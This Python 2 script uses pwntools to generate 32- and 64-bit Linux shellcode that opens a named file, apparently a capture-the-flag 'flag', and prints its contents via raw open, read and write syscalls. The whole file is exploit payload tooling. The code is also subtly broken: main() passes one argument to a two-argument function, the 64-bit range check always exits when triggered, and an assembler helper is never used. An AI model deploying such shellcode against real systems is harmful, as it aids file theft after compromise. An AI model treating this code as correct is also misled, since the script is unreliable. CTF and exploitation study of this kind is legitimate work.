#!/usr/bin/env python
"""
Creates shellcode reading the filename to stdout using only open, read and write syscalls.
Usage: ./gen.py filename
"""

import sys
import pwn

LEN = 100

asm_memo = {}


def asmit(code, b=64):
    arch = 'i386'
    if b == 64:
        arch = 'amd64'
    if code in asm_memo:
        return asm_memo[code]
    asm_memo[code] = pwn.asm(code, arch=arch)
    return asm_memo[code]


def atoh(c):
    return "%02x" % ord(c)


def shellcode(flag, b):
    if b == 32:
        return shellcode32(flag)
    elif b == 64:
        return shellcode64(flag)
    sys.stderr.write('unsupported: %d\n' % b)
    return ''


def shellcode64(flag):
    sp = 'rsp'
    r0 = 'rax'
    r1 = 'rdi'
    r2 = 'rsi'
    r3 = 'rdx'
    syscall = 'syscall\n'

    code = ''

    step = 8
    flag += '\x00'
    while len(flag) % step != 0:
        flag += '\x00'

    # open
    for i in reversed(range(0, len(flag), step)):
        addr = 0
        for j in reversed(range(step)):
            addr *= 0x100
            addr += ord(flag[i + j])
        limit = 1 << 63
        if addr >= limit:
            addr -= limit
            if addr >= 0:
                sys.stderr.write('addr out of range: %d\n' % addr)
                exit(1)

        code += 'mov %s, %d\n' % (r1, addr)
        code += 'push %s\n' % r1

    code += 'mov eax, 2\n'  # sys_open = 2
    code += 'mov %s, %s\n' % (r1, sp)
    code += 'xor %s, %s\n' % (r2, r2)
    code += 'xor %s, %s\n' % (r3, r3)
    code += syscall

    # read
    code += 'mov edi, eax\n'  # int fd
    code += 'xor eax, eax\n'  # sys_read = 0
    code += 'mov %s, %d\n' % (r3, LEN)
    code += 'sub %s, %s\n' % (sp, r3)
    code += 'mov %s, %s\n' % (r2, sp)
    code += syscall

    # write
    code += 'mov edi, 1\n'  # stdout
    code += 'mov eax, edi\n'  # sys_write = 1
    code += syscall

    # exit
    code += 'mov eax, 60\n'  # sys_exit = 60
    code += 'xor edi, edi\n'
    code += syscall

    return code


def shellcode32(flag):
    sp = 'esp'
    r0 = 'eax'
    r1 = 'ebx'
    r2 = 'ecx'
    r3 = 'edx'
    sys_read = 3
    sys_write = 4
    sys_open = 5
    sys_exit = 1
    syscall = 'int 0x80\n'

    step = 4
    flag += '\x00'
    while len(flag) % step != 0:
        flag += '\x00'

    # open
    code = ''
    code += 'xor %s, %s\n' % (r2, r2)
    code += 'xor %s, %s\n' % (r3, r3)

    for i in reversed(range(0, len(flag), step)):
        addr = 0
        for j in reversed(range(step)):
            addr *= 0x100
            addr += ord(flag[i + j])
        limit = 1 << 31
        if addr >= limit:
            addr -= limit
            if addr >= 0:
                sys.stderr.write('addr out of range: %d\n' % addr)
                exit(1)

        code += 'mov %s, %d\n' % (r1, addr)
        code += 'push %s\n' % r1

    code += 'mov %s, %s\n' % (r1, sp)
    code += 'mov %s, %d\n' % (r0, sys_open)
    code += syscall

    # read
    code += 'mov %s, %s\n' % (r1, r0)
    code += 'mov %s, %d\n' % (r0, sys_read)
    code += 'sub %s, %d\n' % (sp, LEN)
    code += 'mov %s, %s\n' % (r2, sp)
    code += 'mov %s, %d\n' % (r3, LEN)
    code += syscall

    # write
    code += 'mov %s, %d\n' % (r0, sys_write)
    code += 'mov %s, 1\n' % r1
    code += syscall

    # exit
    code += 'mov %s, %d\n' % (r0, sys_exit)
    code += 'xor %s, %s\n' % (r1, r1)
    code += syscall

    return code


def main():
    print shellcode(sys.argv[1])


if __name__ == "__main__":
    main()
